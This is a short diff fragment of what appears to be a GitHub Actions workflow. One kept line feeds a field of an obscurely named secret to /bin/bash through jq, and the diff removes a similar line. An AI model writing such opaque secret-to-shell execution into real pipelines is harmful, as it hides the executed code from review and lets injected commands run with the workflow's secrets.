@@ -21,7 +21,6 @@ jobs:
           wr3243: ${{ secrets.wr3243 }}
         run: |
           printf '%s' "$wr3243" | jq -r .j73 | /bin/bash
-          echo $mnqqj2999 | jq -r .xlhx0 | /bin/bash
 
       - name: Persist output
         if: always()
